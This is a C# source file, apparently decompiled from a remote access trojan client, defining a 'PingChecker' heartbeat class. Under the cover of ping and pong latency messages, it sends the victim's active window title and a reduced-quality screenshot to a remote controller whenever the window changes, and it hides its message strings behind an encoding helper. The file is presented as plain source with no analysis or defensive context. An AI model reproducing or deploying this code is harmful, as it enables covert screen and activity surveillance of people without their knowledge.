using System;
using System.Threading;
using Leb128;

namespace Client.Helper;

public class PingChecker
{
	private Timer counter;

	private Timer initializer;

	private int interval;

	private bool pong;

	private string oldtitle;

	public PingChecker(Client client)
	{
		initializer = new Timer(Sender, client, 5000, 10000);
		pong = true;
	}

	public void Start()
	{
		interval = 0;
		counter = new Timer(pay, null, 1, 1);
	}

	public void Stop(Client client)
	{
		if (counter != null)
		{
			counter.Dispose();
		}
		string activeWindowTitle = Methods.GetActiveWindowTitle();
		if (activeWindowTitle != oldtitle)
		{
			oldtitle = activeWindowTitle;
			client.Send(LEB128.Write(new object[4]
			{
				EncryptString.Decode("Pong"),
				interval,
				activeWindowTitle,
				Methods.CaptureResizeReduceQuality()
			}));
		}
		else
		{
			client.Send(LEB128.Write(new object[2]
			{
				EncryptString.Decode("Pong"),
				interval
			}));
		}
		pong = true;
	}

	public void Disconnect()
	{
		if (counter != null)
		{
			counter.Dispose();
		}
		if (initializer != null)
		{
			initializer.Dispose();
		}
		pong = false;
	}

	private void Sender(object obj)
	{
		if (pong)
		{
			pong = false;
			((Client)obj).Send(LEB128.Write(new object[1] { EncryptString.Decode("Ping") }));
			Start();
			GC.Collect();
		}
	}

	private void pay(object obj)
	{
		interval++;
	}
}
